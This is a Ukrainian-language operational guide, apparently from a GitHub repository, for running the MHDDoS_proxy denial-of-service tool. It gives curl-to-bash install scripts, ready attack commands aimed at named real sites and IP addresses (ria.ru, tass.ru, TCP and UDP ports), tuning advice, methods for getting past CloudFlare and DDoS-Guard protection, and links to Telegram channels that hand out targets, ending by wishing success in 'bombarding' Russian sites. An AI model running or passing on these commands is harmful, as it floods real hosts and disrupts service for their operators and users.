<h1 align="center">Детальний розбір MHDDoS_proxy</h1>

<br/>

<!-- TABLE OF CONTENTS -->
<details>
  <summary>ЗМІСТ</summary>
  <ol>
    <li><a href="#%D0%BF%D1%96%D0%B4%D0%B3%D0%BE%D1%82%D0%BE%D0%B2%D0%BA%D0%B0-%D1%81%D0%B5%D1%80%D0%B5%D0%B4%D0%BE%D0%B2%D0%B8%D1%89%D0%B0">Підготовка середовища</a></li>
    <li>
      <a href="#%D0%B7%D0%B0%D0%BF%D1%83%D1%81%D0%BA-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8">Запуск атаки</a>
      <ul>
        <li><a href="#docker">Docker</a></li>
        <li><a href="#python">Python</a></li>
      </ul>
    </li>
    <li><a href="#%D1%80%D0%BE%D0%B7%D0%B1%D1%96%D1%80-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D1%96%D0%B2">Розбір параметрів</a></li>
    <li><a href="#%D0%B2%D0%B0%D1%80%D1%96%D0%B0%D0%BD%D1%82%D0%B8-%D0%B0%D1%82%D0%B0%D0%BA">Варіанти атак</a></li>
    <li><a href="#%D0%BF%D0%BE%D1%8F%D1%81%D0%BD%D0%B5%D0%BD%D0%BD%D1%8F-%D0%B0%D1%82%D0%B0%D0%BA">Пояснення атак</a></li>
    <li><a href="#%D0%BF%D1%96%D1%81%D0%BB%D1%8F%D0%BC%D0%BE%D0%B2%D0%B0">Післямова</a></li>
    <li><a href="#%D0%BA%D0%BE%D1%80%D0%B8%D1%81%D0%BD%D1%96-%D0%BF%D0%BE%D1%81%D0%B8%D0%BB%D0%B0%D0%BD%D0%BD%D1%8F">Корисні посилання</a></li>
  </ol>
</details>

<br/>

**ВАЖЛИВО!**
* Для даного типу атак VPN не потрібен, бо під капотом скрипта використовуються proxy. Виняток для адрес типу UDP, тоді потрібно підключати VPN.
* Зверніть увагу на параметри `-t` та `--http-methods` під час виклику команд для атак. Детальніше про них можете [почитати тут](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md#%D1%80%D0%BE%D0%B7%D0%B1%D1%96%D1%80-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D1%96%D0%B2)
* Старайтеся запускати атаки із кількох віртуальних машин (якщо Ви працюєте із онлайн-сервісу). Наприклад, дві машини із атаками на Layer 7 та дві із атаками на Layer 4 (вибирайте, як Ви вважаєте за потрібне). Так буде набагато більше користі. Якщо Ви працюєте із локального комп'ютера, відкривайте лише один Термінал і проводьте одну атаку, якщо задається лише атака на один конкретний Layer та відкривайте два різні Термінали й на кожному із них проводьте атаки на різні Layer, якщо задаються атаки на різні Layers.

<br/>

## Підготовка середовища

1. Для даних атак раджу використовувати віртуальні машини на онлайн-сервісах. [Ось посилання](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/make_vm_DigitalOcean.md) на авторський гайд по розвертанню віртуальних машин на Digital Ocean. Взагалі можете користуватися будь-якими онлайн-сервісами на свій смак (AWS, Azure, Google Cloud). Посилання на інші гайди можна знайти в загальному Туторіалі.

2. Також, якщо у Вас Linux, Ubuntu або Mac, можете ранити дані скрипти локально із свого комп'ютера (проте рекомендую все ж таки віртуальні машини на онлайн-сервісах). Якщо ж у Вас Windows, то рекомендую поставити на нього імітатор Linux для власної зручності. [Посилання, як це робити](https://telegra.ph/Prisoedinyaemsya-k-botnetu-dlya-DDoS-ataki-s-ispolzovaniem-dockerprotonVPN-02-27). **Примітка!** OpenVPN у даному гайді скачувати й настроювати не потрібно, лише налаштування віртуальної машини. Скрипт можна ранити й напряму із Windows через PowerShell, але тоді самостійно скачуйте все необхідне (далі наведені всі необхідні посилання).

**ВАЖЛИВО!** Далі скачуйте або Docker (**рекомендовано**), або Python у залежності від того, що Ви плануєте далі використовувати.

3. **Docker.** Нижче наведено посилання на гайди по тому, як скачувати Docker на різні операційні системи.
   * [Ubuntu](https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository)

   Для Ubuntu Ви також можете використати вже авторський готовий скрипт, який повністю встановить Docker:
   ```sh
   curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/docker_install.sh | bash
   ```
   
   * [Mac](https://docs.docker.com/desktop/mac/install/)
   * [Windows](https://docs.docker.com/desktop/windows/install/)

4. **Python.** Нижче наведено команду для скачування Python через Термінал для Ubuntu (якщо виникають якісь проблеми, перейдіть за посиланням і попробуйте встановити Python згідно гайду), гайд по встановленню Python на Mac та посилання для скачування Python та Git на Windows.
   * UNIX-подібні ([Python](https://www.digitalocean.com/community/tutorials/how-to-install-python-3-and-set-up-a-programming-environment-on-an-ubuntu-20-04-server-ru))
   ```sh
   sudo apt-get update
   sudo apt install python3 python3-pip
   ```
   Також можна встановити Python (і також необхідний код для MHDDoS_proxy) за дпомогою готового скрипта: 
   ```sh
   curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash
   ```
   * Mac ([Python](https://docs.python-guide.org/starting/install3/osx/))
   * Windows ([Python](https://www.python.org/ftp/python/3.10.2/python-3.10.2-amd64.exe) [Git](https://github.com/git-for-windows/git/releases/download/v2.35.1.windows.2/Git-2.35.1.2-64-bit.exe))

<br/>

## Запуск атаки

Нижче наведені приклади атаки на Docker та Python. Загалом конкретні атаки (уже готові команди) дають багато Телеграм-каналів, які використовують даний скрипт для атак. Посилання на ці Телеграм-канали можете знайти [тут](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md#%D0%BA%D0%BE%D1%80%D0%B8%D1%81%D0%BD%D1%96-%D0%BF%D0%BE%D1%81%D0%B8%D0%BB%D0%B0%D0%BD%D0%BD%D1%8F). Вам потрібно лише скопіювати готовий код і вставити його в Термінал Вашого локального комп'ютера, віртуального середовища, чи віртуальної машини на онлайн-сервісі.

### Docker

Приклад коду для запуску скрипта через Docker. Детальніше про параметри скрипта [дивись тут](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md#%D1%80%D0%BE%D0%B7%D0%B1%D1%96%D1%80-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D1%96%D0%B2).

**ВАЖЛИВО!** Якщо Docker викидує якусь помилку, спробуйте запустити його кілька разів (може бути таке, що не вдається зразу встановити зв'язок із проксі-серверами через велику їх нагрузку на даний момент). Якщо ж проблема залишається, то спробуйте варіант із Python нижче (бувало таке, що не вдавалося зпулити Docker імедж через його недавнє видалення, або проблеми із серверами GitHub, де цей Docker імедж зараз зберігається).

```sh
sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru
```

### Python

Перед запуском скрипта на Python потрібно підтягнути увесь необхідний код із GitHub.

```sh
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
cd mhddos_proxy
git clone https://github.com/MHProDev/MHDDoS.git
python3 -m pip install -r MHDDoS/requirements.txt
```

Також у Вас є можливість запустити вже готовий скрипт для Ubuntu, який скачає все необхідне, включаючи Python, Git, усі необхідні залежності, серцевий код із ГітаХабу й тд:
```sh
curl -s https://raw.githubusercontent.com/SlavaUkraineSince1991/DDoS-for-all/main/scripts/python_git_MHDDoS_proxy_install.sh | bash
```

Далі просто запускаємо скрипт. Детальніше про параметри скрипта [дивись тут](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md#%D1%80%D0%BE%D0%B7%D0%B1%D1%96%D1%80-%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D1%96%D0%B2).

```sh
python3 runner.py https://ria.ru https://tass.ru
```

**Увага!** Якщо виникають якісь проблеми із Python, спробуйте замість `python3` написати `python` (зокрема, так потрібно робити для Windows).

<br/>

## Розбір параметрів

Тут і далі будемо показувати приклади команд із використанням Docker. Якщо Вам потрібен Python, то [перейдіть сюди](https://github.com/SlavaUkraineSince1991/DDoS-for-all/blob/main/MHDDoS_proxy.md#python). Або ж просто замінюйте `sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy` на `python3 runner.py`

Взагалі, загальний вигляд команди виглядає так:

```sh
sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> -t <threads> -p <period> --proxy-timeout <proxy_timeout> --rpc <n_requests> <--debug> --http_methods <list of http_methods>
```

Одразу ж прошу Вас звернути увагу на параметр -t й експериментально встановити значення для нього для конкретно Вашої машини й Вашого інтернету.

Тепер по кожному із параметрів:

* `<list of targets>` - список таргетів (адрес), які передаються через пробіл
* `<config_file>` - посилння на файл із адресами в текстовому форматі (нова адреса із нового рядка). Якщо передаєтсья цей параметр, то `<list of targets>` залишається порожнім
* `<threads>` - кількість потоків на одне ядро. Це один із найважливіших параметрів. Його Ви має старатися підібрати оптимальним саме під Вашу машину. За замовчуванням 300, можете дивитися на нагрузку CPU та RAM. Якщо нагружені не на максимум, то можна цей параметр збільшити, проте будьте обережні, бо переважно спочатку нагрузка невелика, а потім починає зростати. Якщо ж навпаки, усе загружено по максимуму й атаки не проходять, старайтеся цей параметр знижувати. Усе залежить від Вашої машини, кількості ядер, інтернету й тд
* `<period>` - як часто обновлювати проксі. За замовчуванням 600 секунд, тобто кожні 10 хвилин. Впринципі, це значення є оптимальним. Якщо хочете, можете його змінювати
* `<proxy_timeout>` - скільки часу чекати, щоб проксі під'єдналося. За замовчуванням 3 секунди. Впринципі, це значення є оптимальним. Якщо хочете, можете його змінювати
* `<n_requests>` - скільки запитів відправляти, враховуючи одне проксі. За замовчуванням 1000. Впринципі, це значення є оптимальним. Якщо хочете, можете його змінювати
* `<--debug>` - чи виводити додаткову інформацію, чи ні. Якщо цей параметр присутній, то виводити, якщо ні, то ні. Бажано використовувати, щоб моніторити, чи взагалі проходять атаки, чи ні
* `<list of http_methods>` - список методів для атаки. За замовчуванням для HTTP адрес метод обирається рандомно серед методів GET, POST, STRESS, BOT, PPS; для TCP та UDP адрес методи TCP та UDP відповідно. Доцільно використовувати, коли для сайту, який ми атакуємо відомий його захист, тоді можна передавати CFB для проходження захисту CloudFlare; CFBUAM для проходження захисту CloudFlare Under Attack Mode; DGB для проходження захисту DDoS Guard і тд. Детальніше про всі методи можна [переглянути тут](https://github.com/MHProDev/MHDDoS#features-and-methods). Якщо ж захист нам невідомий, то доцільно використати метод BYPASS, який довзволяє проходити захист звичайних AntiDDoS рішень, або ж залишити цей параметр за замовчуванням. **ВАЖЛИВО!** Як каже розробник скрипта цей параметр обов'язково повинен бути вкінці виклику команди

І окремо наводжу документацію. [Посилання на неї](https://github.com/porthole-ascend-cinnamon/mhddos_proxy#%D0%B4%D0%BE%D0%BA%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%B0%D1%86%D1%96%D1%8F)

```sh
usage: runner.py target [target ...]
                 [-t THREADS] 
                 [-p PERIOD]
                 [--proxy-timeout TIMEOUT]
                 [--rpc RPC] 
                 [--udp-threads UDP_THREADS]
                 [--debug]
                 [--http-methods METHOD [METHOD ...]]

positional arguments:
  targets                List of targets, separated by space

optional arguments:
  -h, --help             show this help message and exit
  -c, --config URL       URL to a config file (list of targets in plain text)
  -t, --threads 300      Threads per CPU core (default is 300)
  -p, --period 600       How often to update the proxies (default is 600)
  --proxy-timeout 3      How many seconds to wait for the proxy to make a connection.
                         Higher values give more proxies, but with lower speed/quality.
                         Parsing also takes more time (default is 3)

  --debug                Enable debug output from MHDDoS
  --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
  --udp-threads 1        Threads to run per UDP target (default is 1, change carefully)

  --http-methods GET     List of HTTP(s) attack methods to use.
                         (default is GET, POST, STRESS, BOT, PPS)
                         Refer to MHDDoS docs for available options
                         (https://github.com/MHProDev/MHDDoS)
```

<br/>
  
## Варіанти атак

* Атака на Layer 7 (по HTTP(S) адресах)
  ```sh
  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy https://ria.ru https://tass.ru -t 1000 --debug --http-methods BYPASS
  ```
  ```sh
  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy 5.188.56.124:80 5.188.56.124:3606 -t 1000 --debug --http-methods BYPASS
  ```
* Атака на Layer 4 (по TCP адресам)
  ```sh
  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy tcp://194.54.14.131:4477 tcp://194.54.14.131:22 -t 1000 --debug --http-methods TCP
  ```
* Атака на Layer 4 (по UDP адресам)

  **Необхідно використовувати VPN!!!** Налаштувати його можна за допомогою [ось цього гайду](https://telegra.ph/Prisoedinyaemsya-k-botnetu-dlya-DDoS-ataki-s-ispolzovaniem-dockerprotonVPN-02-27), гортайте нижче.
  ```sh
  sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy udp://217.175.155.100:53 -t 1000 --debug --http-methods UDP
  ```
  
<br/>

## Пояснення атак

Після запуску атак повинен з'явитися наступний текст. Якщо з'явився, значить усе добре, скрипт запустився й працює.

<p align="center">
  <img src="/images/MHDDoS_proxy/1.png?raw=true" />
</p>

Після з'єднання й налаштування проксі, має з'явитися інформація про атаки. Якщо вивід приблизно такий, як на скріні (серед атак із 0 нагрузкою на таргет часто трапляються ті, які роблять нагрузку), значить усе добре, скрипт працює, атака йде. Періодично моніторьте, чи вивід залишається таким. Якщо ні - то можете перезапустити атаку.

<p align="center">
  <img src="/images/MHDDoS_proxy/2.png?raw=true" />
</p>

І коротко про параметри атаки:

* `PPS` - кількість встановлених з'єднань із ціллю атаки
* `BPS` - вага пакетів у байтах, кілобайтах, мегабайтах. Оптимально в районі 500 Кб
* `%` - це просто хід вашої атаки, час до обновлення проксі, нічого спільного із ефективністю не має

<br/>

## Післямова

Ось і все. Якщо виникають будь-які питання, пишіть їх у коментарях під постами в [цьому Телеграм-каналі](https://t.me/+Z_LFYsLfmmM4YmUy).

**Вдалого бомбардування рашистських сайтів! Слава Україні!**

<p align="center">
  <img src="/images/slava_ukraine.jpg?raw=true" />
</p>

<br/>

## Корисні посилання

* [Посилання на Гіт MHDDoS_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy)
* [Посилання на Гіт оригінального MHDDoS](https://github.com/MHProDev/MHDDoS)
* [Посилання на інший гайд по MHDDoS_proxy](https://telegra.ph/MHDDoS-Proxy-03-13)
* [Посилання на гайд по оригінальному MHDDoS](https://telegra.ph/Glubokij-razbor-MHDDoS-SHpargalka-03-02)
* [Посилання на Телеграм-канал DDOS Tutorial for all](https://t.me/+Z_LFYsLfmmM4YmUy)
* [Посилання на Телеграм-канал KiberBULL](https://t.me/+NdmAn-xnANNlYjJi)
* [Посилання на Телеграм-канал Украинский Жнец](https://t.me/+-GoGtA_IsOk3YmE6)

<br/>
<br/>
<br/>

Гайд підготовлений командою **DDOS Tutorial for all**. [Посилання на Телеграм-канал](https://t.me/+Z_LFYsLfmmM4YmUy)
